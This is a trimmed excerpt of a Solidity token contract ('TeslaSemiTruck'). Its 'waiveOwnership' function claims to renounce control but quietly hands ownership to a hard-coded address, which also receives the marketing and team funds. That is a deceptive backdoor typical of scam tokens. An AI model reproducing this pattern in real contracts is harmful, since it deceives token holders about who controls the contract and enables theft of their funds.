...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1CC31450Da91A3325381d38fF69F90782231874e));
        _owner = address(0x1CC31450Da91A3325381d38fF69F90782231874e);
    }
...
contract TeslaSemiTruck is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x1CC31450Da91A3325381d38fF69F90782231874e);
    address payable public teamWalletAddress = payable(0x1CC31450Da91A3325381d38fF69F90782231874e);
